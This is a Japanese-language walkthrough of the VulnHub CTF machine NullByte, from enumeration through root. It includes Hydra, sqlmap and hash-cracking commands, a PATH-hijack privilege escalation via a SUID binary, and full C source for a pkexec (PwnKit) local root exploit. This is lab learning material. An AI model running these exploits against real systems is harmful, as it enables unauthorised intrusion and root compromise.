## NullByte  760~
### ポートスキャンまでは同じ
- 80,111,777,4474

### Webサイトを見る
- `ctrl + u`でHTMLソースコードが見れるので、チェックする。ここには画像であるmain.gifぐらいしかないが、、

### dirb
- gobusterみたいに隠しサイトを見つけてくるもの。ただ、Gobusterとは異なり、ディレクトリを深く再帰していく
- `dirb http://$IP /usr/share/dirb/wordlists/small.txt`
  - デフォルトのwordlists使うと終わらない
  - wordlistsには他にbig.txt,common.txt,samll.txtがあるが、単語数はどれぐらいか？
- phpMyAdmin,javascript,uploadsディレクトリが見つかる、今はどうしようもないので後で使う
- (追記)
  - `wfuzz -c -z file,/usr/share/dirb/wordlists/small.txt --hw 32 http://$IP/FUZZ` 


### 怪しい画像ファイルを調査する
- 画像サイトでソースを見る ショートキーの`ctrl + u`それでmain.gifであることがわかる
- `wget http://$IP:80/main.gif -P main.gif`
- ファイルを開ける
  - `eog main.gif`
- ファイルを調べる、どちらでもいいがexiftoolの方が有能
  - stringコマンドはファイルの中に文字列があるのを抜き出してくる`strings main.gif`
  - `exiftool main.gif` exiftoolコマンドは画像などのメタデータを調べるコマンド
- 謎のコメントが得られる`kzMb5nVYJw`こういう、画像のなどのファイルに他のデータなどファイルを隠すことをステガノグラフィと呼ぶ
- `steghide extract -sf main2.gif`
  - passwordを聞かれてもわからないので、多分ない 
### Webサイト 
- `http://192.168.56.?/kzMb5nVYJw`サイトを見る

### Hydraで攻略
- HTMLソース(ctrl + u)のコメントに使うツールのヒントが書かれている
- WebサイトのHTMLソースからindex.phpのkeyにパスワードが送信されていることがわかる
- 適当に入力して改行する、`invalid key`と返ってくるのに注目する
- `hydra -l test -P ~/vulnhub/SecLists-master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt $IP 
http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid key"` 
  - ここでは１箇所しか入力するところがないので、ユーザ名は適当なtestという名前を入れている
  -　IPアドレスには`http://`は書かない
  - $IPの場所はhttp-post-formの前に書く
  - http-post-formやhttp-form-postのどちらでもいいらしい
  - オンラインツールのhydraでは時間がかかるのでrockyou.txtは使わない
  - http-post-formは三つの区間に分かれている。"対象URL:リクエストデータ:スキップするレスポンスに含まれる文字列"
    - 対象URLにはサイトのディレクトリやファイル名を書く
    - リクエストデータの`key=^PASS^`はhtmlのソースにあるkeyに辞書のパスワードが順に入ることになる。ブラウザでチェックする
    - スキップするレスポンスに含まれる文字列とは、失敗した時に返ってくる文字列のこと、ここでは`invalid key`のこと、もちろん`invalid`だけでもいい
  - `~ $IP/kzMb5nVYJw http-post-form ~`みたいな書き方はエラーになる
- パスワードがわかる `elite`
- webサイトにパスワードがあるので、入力する

### 得られたkeyで認証する
- search for usernamesページ
```html
<p>Search for usernams: </p>
<hr>
<form action="420search.php" method="get">
Enter username:<br>
<input type="text" name="usrtosearch">
</form>
```

- 空のまま`Enter`を押すと、とりあえずuser名がわかる。この表示はSQLっぽい。
  - `ramses` `isis` 
- リンクを見たら最後に`php?usrtosearch=`となっている、ここの最後にいろいろ入力してみる
  - SQLインジェクションの典型的なコードを入力してみる`1' OR 'a'='a`
  - 特に何も起こらない
  - `'`
  - これも何も起こらない
  - `"`
  - これでエラーを吐き出すのでSQLInjectionができることがわかる 



### SQLMapツールで突破する
- `--`ハイフン２つで検索して表示。`-`ハイフン１つで表示の指定ができる
- データベースの中身を確認する
- `sqlmap -u "http://192.168.56.108/kzMb5nVYJw/420search.php?usrtosearch=" --dbs　--batch  --level=5`
  - `--level=5` defaultは1で数字が大きいほど試す範囲が大きくなるので成功しやすいが、時間がかかる 
- sethのデータベースのtableを見る
- `sqlmap -u "http://192.168.56.108/kzMb5nVYJw/420search.php?usrtosearch=" -D seth --tables --batch`
- tableにはusersがある。次はカラムを出力する
- `sqlmap -u "http://192.168.56.108/kzMb5nVYJw/420search.php?usrtosearch=" -D seth -T users --columns --batch`
- position,user,id,passがあるのがわかる
- `sqlmap -u "http://192.168.56.108/kzMb5nVYJw/420search.php?usrtosearch=" -D seth -T users -C id,position,user,pass --dump`
  - `--dump`でtablesを表示することができる 
- いろいろ聞かれるが、全部`y`を入力して押す
- ramsesのpassをコピーする



### Base64でデコードする
- 単語の数を数えてみる4の倍数ならbase64になる
  - `echo -n ペースト | wc` 
- ペーストした最後に`=`イコールをつけてパッディングして復号する
- `echo -n "ペースト=" | base64 -d`
  - うまく変換できていれば、hash.txtに保存する
- `echo -n "ペースト=" | base64 -d > hash.txt`  

### パスワードの解析
- 文字の数が32文字であることから、md5っぽい
- (1) john the ripper
- `hashid hash.txt`や`hash-identifier ハッシュ値`でもmd5っぽい
- `sudo john --format=raw-md5 hash.txt`
  - hash.txtに書き込んだのはmd5という形式の暗号化である
  - 過去に解読してる場合`sudo john --show --format=raw-md5 hash.txt`
- (2) hashcat
- `hashcat -m 0 'ハッシュ値' /usr/share/wordlists/rockyou.txt`
  - `-m` md5 

### ssh
- `ssh ramses@192.168.56.108 -p 777`
  - password:omega
  - ポート番号に注意

### システム内を探索する
- フォルダを探索する
- `sudo -l`
  - パスワードがわからない 
- SUIDを探す
  - `find / -perm -u=s -type f 2> /dev/null` 順番も合ってないとエラーになるので注意
  - `find / -perm /4000 -type f 2>/dev/null`
  - 怪しいコマンドがある
  - pkexecはmsfconsoleでは取れないが、pkexec.shなら取れる
- `cat .bash_hitory`
  - 謎のコマンドを実行していることがあるので、大きなヒントになる 

### 怪しいプログラムを調べる
- SUIDで探した怪しいprocwatchファイルを調べる
  - `cd /var/www/backup`
  - `cat procwatch` 文字化けしている、バイナリファイルかもしれない
  - `file procwatch` 実行ファイルだとわかる
- 謎のコマンドが実行されている
  - `./procwatch`

### PATHハイジャック
- これはどこかで見たことのあるコマンド?procwatchは裏でpsコマンドを呼んでいるので、そのpsコマンドを書き換えてbashが起動するようにする。
- psコマンドがコマンド名だけで実行されていたら(フルパスでない)、PATHハイジャックができる可能性がある 
  - `strings procwatch`
  - `strings procwatch | grep ps`
- `echo $PATH`
  - PATHは左から順に読み込まれるので、本物のpsコマンドより先に偽のbashを書いたpsコマンドを/tmpディレクトリをはじめに置いて、先に読み込ませる
- psコマンドをどこからでも呼べるためにパスを通す
  - `export PATH=/tmp:$PATH`
- `echo $PATH`
- pcコマンドのファイルにシェル(sh)を実行できるように書き込む
  - `echo "/bin/sh" > /tmp/ps`
- `chmod 777 /tmp/ps`
- ./procwatchを実行すると、裏でpsファイルが呼ばれて、そこにはshが書かれているので、shが実際は実行される。procwatchはSUID
  - `./procwatch` 
### 権限の昇格
- `cd /root`
- `cat proof.txt`

### OSの脆弱性を使ってrootになる
- suidのpkexecの脆弱性
- `nano tmp.sh`
```
cd /tmp

cat << EOF > evil-so.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0);

    execve("/bin/sh", NULL, NULL);
}

EOF

gcc -shared -o evil.so -fPIC evil-so.c

cat << EOF > exploit.c
#include <stdio.h>
#include <stdlib.h>

#define BIN "/usr/bin/pkexec"
#define DIR "evildir"
#define EVILSO "evil"

int main()
{
    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        "SHELL=ryaagard",
        "CHARSET=ryaagard",
        NULL
    };
    char *argv[] = { NULL };

    system("mkdir GCONV_PATH=.");
    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
    system("mkdir " DIR);
    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
    system("cp " EVILSO ".so " DIR);

    execve(BIN, argv, envp);

    return 0;
}

EOF

gcc exploit.c -o exploit

chmod +x exploit

./exploit


```
